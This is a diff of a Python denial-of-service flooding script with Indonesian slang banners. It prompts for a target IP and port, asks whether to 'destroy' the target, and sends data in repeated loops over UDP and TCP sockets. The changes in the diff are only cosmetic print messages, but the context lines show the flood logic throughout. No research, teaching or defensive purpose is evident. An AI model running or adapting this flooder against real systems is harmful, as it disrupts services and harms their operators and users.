@@ -5,7 +5,7 @@ import threading
 
 print       (" - - > AUTHOR : XTraylinz    CODE : XTraylinz < - - ")
 print       (" - - >      READY NIH GAS KAN BRE HAJAR       < - - ")
-    
+print       (" - - >  IJIN RENAME BWANG AUTHOR GAK DIGANTI  < - - ")
 ip = str(input("  Ip Nya:"))
 port = int(input(" Port Nya:"))
 choice = str(input(" HANCURIN GAK NICH? (y/n):"))
@@ -20,7 +20,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PAKET !! ")
+			print(i +" PAKET Sampe nih Dari XmadNixx !! ")
 		except:
 			print("[!] GASUKA BAYWAN DECK")
 
@@ -34,7 +34,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PAKET !! ")
+			print(i +" PAKET BANG !! ")
 		except:
 			s.close()
 			print("[*] GASUKA BAYWAN DECK")
